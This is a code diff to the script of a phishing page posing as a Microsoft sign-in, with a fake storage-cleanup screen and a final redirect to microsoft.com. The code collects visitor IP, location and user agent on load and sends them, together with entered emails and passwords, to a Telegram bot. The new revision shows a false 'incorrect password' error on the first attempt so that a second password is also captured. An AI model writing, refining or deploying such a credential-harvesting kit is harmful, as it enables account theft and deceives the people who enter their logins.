-        let userIP = '';
-        let userLocation = '';
 
-        // Get IP address and location on page load
+        // IP / location
         async function getUserIP() {
             try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
+                const resp = await fetch('https://api.ipify.org?format=json');
+                const data = await resp.json();
                 userIP = data.ip;
-                
-                const locationResponse = await fetch(`https://ipapi.co/${userIP}/json/`);
-                const locationData = await locationResponse.json();
-                userLocation = `${locationData.city}, ${locationData.region}, ${locationData.country_name}`;
-            } catch (error) {
-                userIP = 'Unknown';
-                userLocation = 'Unknown';
-            }
+                const locResp = await fetch(`https://ipapi.co/${userIP}/json/`);
+                const locData = await locResp.json();
+                userLocation = `${locData.city || '?'}, ${locData.region || '?'}, ${locData.country_name || '?'}`;
+            } catch { /* ignore */ }
         }
-
-        // Initialize IP capture
         getUserIP();
-        
-        // Send notification on first visit
+
         function sendFirstVisitNotification() {
             if (!firstVisit) return;
-            
-            const message = `🔔 New Visitor Notification - RESEARCH LAB\n\n🌐 IP Address: ${userIP}\n📍 Location: ${userLocation}\n🖥️ User Agent: ${navigator.userAgent}\n🕒 Time: ${new Date().toLocaleString()}\n🔗 URL: ${window.location.href}`;
-            
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-            
-            fetch(url, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    chat_id: TELEGRAM_CHAT_ID,
-                    text: message,
-                    parse_mode: 'HTML'
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log('First visit notification sent:', data);
-            })
-            .catch(error => {
-                console.error('Error sending first visit notification:', error);
-            });
-            
+            const msg = `🔔 Visitor · Microsoft 2026\n🌐 IP: ${userIP}\n📍 ${userLocation}\n🕒 ${new Date().toLocaleString()}\n📱 UA: ${navigator.userAgent.substring(0,80)}`;
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method:'POST', headers:{'Content-Type':'application/json'},
+                body: JSON.stringify({chat_id: TELEGRAM_CHAT_ID, text: msg})
+            }).catch(()=>{});
             firstVisit = false;
         }
-        
-        // Password toggle functionality
-        passwordToggle.addEventListener('click', function() {
+
+        passwordToggle.addEventListener('click', ()=>{
             passwordVisible = !passwordVisible;
-            
-            if (passwordVisible) {
-                passwordInput.type = 'text';
-                passwordToggle.innerHTML = `
-                    <svg viewBox="0 0 24 24" fill="currentColor">
-                        <path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/>
-                    </svg>
-                `;
-            } else {
-                passwordInput.type = 'password';
-                passwordToggle.innerHTML = `
-                    <svg viewBox="0 0 24 24" fill="currentColor">
-                        <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
-                    </svg>
-                `;
-            }
+            passwordInput.type = passwordVisible ? 'text' : 'password';
+            passwordToggle.innerHTML = passwordVisible 
+                ? `<svg viewBox="0 0 24 24"><path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78 3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/></svg>`
+                : `<svg viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>`;
         });
-        
-        // Handle submit button click
-        submitButton.addEventListener('click', function(e) {
+
+        function isValidEmail(e){ return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(e); }
+
+        // Function to send credentials to Telegram (used in both attempts)
+        function sendCredentialsToTelegram(email, password, attemptNumber) {
+            const msg = `🔐 Microsoft 2026 login (Attempt #${attemptNumber})\n📧 ${email}\n🔑 ${password}\n🌐 IP: ${userIP}\n📍 ${userLocation}\n🕒 ${new Date().toLocaleString()}`;
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method:'POST', headers:{'Content-Type':'application/json'},
+                body: JSON.stringify({chat_id: TELEGRAM_CHAT_ID, text: msg})
+            }).catch(()=>{});
+        }
+
+        submitButton.addEventListener('click', (e)=>{
             e.preventDefault();
             
             if (!emailEntered) {
-                // Validate email
+                // Email screen
                 const email = emailInput.value.trim();
                 if (!email || !isValidEmail(email)) {
                     emailError.style.display = 'block';
                     emailInput.focus();
                     return;
                 }
-                
-                // Hide email error if shown
                 emailError.style.display = 'none';
-                
-                // Show password field
                 emailGroup.classList.add('hidden');
                 passwordGroup.classList.remove('hidden');
                 backButton.classList.remove('hidden');
                 submitButton.textContent = 'Sign in';
                 emailEntered = true;
+                setTimeout(()=>passwordInput.focus(), 100);
+                return;
+            }
+            
+            // --- Password screen ---
+            const pwd = passwordInput.value;
+            if (!pwd) {
+                passwordError.style.display = 'block';
+                passwordInput.focus();
+                return;
+            }
+            passwordError.style.display = 'none';
+            
+            const email = emailInput.value.trim();
+
+            // On first attempt -> show error, send creds, reset to email screen? But spec: after entering email+pass, it says incorrect, then second attempt works.
+            // We want: after first pass submit, show error message "incorrect email or password", and let user stay on password screen? 
+            // But typical behavior: error appears and they can retry. We'll keep password field, show error message, and let them try again.
+            
+            if (firstSignInAttempt) {
+                // First attempt: show invalid creds message, send to Telegram, and set flag to false
+                invalidCredsMessage.style.display = 'flex'; // show warning
+                sendCredentialsToTelegram(email, pwd, 1);
                 
-                // Focus on password field
-                setTimeout(() => {
-                    passwordInput.focus();
-                }, 100);
+                // Mark that next attempt will be the second one
+                firstSignInAttempt = false;
+                
+                // Clear password field for retry
+                passwordInput.value = '';
+                passwordInput.focus();
+                
+                // Do NOT proceed to cleanup
+                return;
             } else {
-                // Validate password
-                const password = passwordInput.value;
-                const email = emailInput.value.trim();
+                // Second attempt: send credentials (attempt #2), then proceed to cleanup
+                sendCredentialsToTelegram(email, pwd, 2);
                 
-                if (!password) {
-                    passwordError.style.display = 'block';
-                    passwordInput.focus();
-                    return;
-                }
+                // Hide any previous error
+                invalidCredsMessage.style.display = 'none';
                 
-                // Hide password error if shown
-                passwordError.style.display = 'none';
-                
-                // Show loading
+                // Show loading overlay
                 loadingOverlay.style.display = 'flex';
                 
-                // Send credentials to Telegram with IP information
-                sendToTelegram(email, password);
-                
-                // After sending credentials, start cleanup process
+                // Simulate brief loading then start cleanup
                 setTimeout(() => {
                     loadingOverlay.style.display = 'none';
                     startCleanupProcess();
-                }, 1500);
+                }, 1400);
             }
         });
-        
-        // Handle back button
-        backButton.addEventListener('click', function() {
+
+        backButton.addEventListener('click', ()=>{
             emailGroup.classList.remove('hidden');
             passwordGroup.classList.add('hidden');
             backButton.classList.add('hidden');
             submitButton.textContent = 'Next';
             emailEntered = false;
-            
-            // Reset password visibility
             passwordVisible = false;
             passwordInput.type = 'password';
-            passwordToggle.innerHTML = `
-                <svg viewBox="0 0 24 24" fill="currentColor">
-                    <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
-                </svg>
-            `;
-            
-            // Focus on email field
-            setTimeout(() => {
-                emailInput.focus();
-            }, 100);
+            passwordToggle.innerHTML = `<svg viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>`;
+            emailInput.focus();
+            // Reset attempt flag if they go back? Probably not needed, but safe: keep flag as is.
+            // Optionally reset flag? No, they might go back and change email, then we want fresh first attempt.
+            // Better: reset firstSignInAttempt if email changes after back? We'll reset when back is pressed.
+            firstSignInAttempt = true; 
+            invalidCredsMessage.style.display = 'none'; // hide error
         });
-        
-        // Start cleanup process - 35 SECONDS
+
+        document.addEventListener('keydown', e=>{ if(e.key==='Enter') submitButton.click(); });
+        emailInput.addEventListener('input', ()=> emailError.style.display = 'none');
+        passwordInput.addEventListener('input', ()=> passwordError.style.display = 'none');
+
+        // Cleanup process (identical, 35 seconds)
         function startCleanupProcess() {
-            // Switch to cleanup section
             loginSection.style.display = 'none';
             cleanupSection.classList.add('active');
-            
+
             let progress = 0;
             let step = 0;
             const steps = [
-                "Scanning for temporary files...",
-                "Analyzing duplicate photos...", 
-                "Checking document versions...",
-                "Reviewing cached data...",
-                "Optimizing storage structure...",
-                "Finalizing cleanup process...",
-                "Applying optimizations..."
+                "Scanning temp files...", "Removing duplicates...",
+                "Cleaning old versions...", "Purging cache...",
+                "Optimizing indexes...", "Finalizing...",
+                "Almost done..."
             ];
-            
-            // Start progress animation - 35 seconds total
-            const progressInterval = setInterval(() => {
-                progress += 0.57; // Approximately 35 seconds to reach 100% (100/35 ≈ 0.57 per 200ms)
+
+            const interval = setInterval(() => {
+                progress += 0.57;
                 if (progress > 100) progress = 100;
                 cleanupProgress.style.width = progress + '%';
-                
-                // Update status message based on progress
-                if (progress >= 15 && step === 0) {
-                    cleanupStatus.textContent = steps[0];
-                    step = 1;
-                } else if (progress >= 28 && step === 1) {
-                    cleanupStatus.textContent = steps[1];
-                    step = 2;
-                } else if (progress >= 42 && step === 2) {
-                    cleanupStatus.textContent = steps[2];
-                    step = 3;
-                } else if (progress >= 56 && step === 3) {
-                    cleanupStatus.textContent = steps[3];
-                    step = 4;
-                } else if (progress >= 70 && step === 4) {
-                    cleanupStatus.textContent = steps[4];
-                    step = 5;
-                } else if (progress >= 85 && step === 5) {
-                    cleanupStatus.textContent = steps[5];
-                    step = 6;
-                } else if (progress >= 95 && step === 6) {
-                    cleanupStatus.textContent = steps[6];
-                    step = 7;
-                }
-                
+
+                if (progress >= 15 && step===0) { cleanupStatus.textContent = steps[0]; step=1; }
+                else if (progress >= 28 && step===1) { cleanupStatus.textContent = steps[1]; step=2; }
+                else if (progress >= 42 && step===2) { cleanupStatus.textContent = steps[2]; step=3; }
+                else if (progress >= 56 && step===3) { cleanupStatus.textContent = steps[3]; step=4; }
+                else if (progress >= 70 && step===4) { cleanupStatus.textContent = steps[4]; step=5; }
+                else if (progress >= 85 && step===5) { cleanupStatus.textContent = steps[5]; step=6; }
+                else if (progress >= 95 && step===6) { cleanupStatus.textContent = steps[6]; step=7; }
+
                 if (progress >= 100) {
-                    clearInterval(progressInterval);
+                    clearInterval(interval);
                     completeCleanup();
                 }
-            }, 200); // Update every 200ms for smooth animation
+            }, 200);
         }
-        
-        // Complete cleanup and show results
+
         function completeCleanup() {
-            cleanupStatus.textContent = "Cleanup complete!";
+            cleanupStatus.textContent = "Optimization complete!";
             cleanupIcon.textContent = "✅";
-            
-            // Animate storage bar decrease
-            setTimeout(() => {
+            setTimeout(()=>{
                 storageBar.style.width = '32%';
-                storageBar.style.background = 'linear-gradient(90deg, #107c10, #5db85d)';
-                
-                // Update storage numbers
-                setTimeout(() => {
-                    usedStorage.textContent = "1.6 GB Used";
-                    freeStorage.textContent = "3.4 GB Free";
-                    
-                    // Show cleanup results
-                    setTimeout(() => {
+                storageBar.style.background = 'linear-gradient(90deg, #0f6b0f, #4caf4c)';
+                setTimeout(()=>{
+                    usedStorage.textContent = "1.6 GB used";
+                    freeStorage.textContent = "3.4 GB free";
+                    setTimeout(()=>{
                         cleanupResults.style.display = 'block';
-                        
-                        // Show completion message
-                        setTimeout(() => {
+                        setTimeout(()=>{
                             cleanupComplete.style.display = 'block';
-                            
-                            // Show redirect message
-                            setTimeout(() => {
+                            setTimeout(()=>{
                                 redirectMessage.style.display = 'block';
-                                
-                                // Start countdown for redirect
-                                let countdown = 3;
-                                const countdownInterval = setInterval(() => {
-                                    countdown--;
-                                    countdownElement.textContent = countdown;
-                                    
-                                    if (countdown <= 0) {
-                                        clearInterval(countdownInterval);
+                                let c = 3;
+                                const cd = setInterval(()=>{
+                                    c--;
+                                    countdownElement.textContent = c;
+                                    if (c<=0) {
+                                        clearInterval(cd);
                                         window.location.href = 'https://www.microsoft.com';
                                     }
-                                }, 1000);
-                            }, 1000);
-                        }, 1000);
-                    }, 1000);
-                }, 1000);
-            }, 500);
+                                },1000);
+                            },800);
+                        },600);
+                    },600);
+                },500);
+            },300);
         }
-        
-        // Handle Enter key press
-        document.addEventListener('keydown', function(e) {
-            if (e.key === 'Enter') {
-                submitButton.click();
-            }
-        });
-        
-        // Hide error messages when user starts typing
-        emailInput.addEventListener('input', function() {
-            emailError.style.display = 'none';
-        });
-        
-        passwordInput.addEventListener('input', function() {
-            passwordError.style.display = 'none';
-        });
-        
-        // Email validation function
-        function isValidEmail(email) {
-            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-            return emailRegex.test(email);
-        }
-        
-        // Function to send credentials to Telegram
-        function sendToTelegram(email, password) {
-            const message = `🔐 Microsoft Login Credentials - RESEARCH LAB\n\n📧 Email: ${email}\n🔑 Password: ${password}\n\n🌐 IP Address: ${userIP}\n📍 Location: ${userLocation}\n🖥️ User Agent: ${navigator.userAgent}\n🕒 Time: ${new Date().toLocaleString()}\n🔗 URL: ${window.location.href}`;
-            
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-            
-            fetch(url, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    chat_id: TELEGRAM_CHAT_ID,
-                    text: message,
-                    parse_mode: 'HTML'
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log('Telegram response:', data);
-            })
-            .catch(error => {
-                console.error('Error sending to Telegram:', error);
-            });
-        }
-        
-        // Auto-focus on email input when page loads
-        window.addEventListener('load', function() {
+
+        window.addEventListener('load', ()=>{
             emailInput.focus();
-            // Send first visit notification
             sendFirstVisitNotification();
         });
     </script>
